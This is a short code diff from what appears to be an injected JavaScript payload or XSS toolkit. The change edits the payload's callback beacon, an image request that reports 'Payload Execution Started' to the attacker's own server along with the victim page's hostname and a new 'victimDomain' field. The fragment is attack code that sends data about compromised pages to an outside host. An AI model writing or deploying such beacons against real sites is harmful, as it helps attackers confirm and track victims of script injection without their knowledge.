@@ -27,7 +27,8 @@
     if (scriptSrc) {
       var pingUri = new URL(scriptSrc);
       var pingImg = new Image();
-      pingImg.src = pingUri.origin + "/message?text=" + encodeURIComponent("Payload Execution Started on " + location.hostname);
+      var victimDomain = location.hostname || (location.protocol === "file:" ? "local-file" : "Unknown");
+      pingImg.src = pingUri.origin + "/message?text=" + encodeURIComponent("Payload Execution Started on " + (location.hostname || location.href)) + "&domain=" + encodeURIComponent(victimDomain);
     }
   } catch (e) { }
 
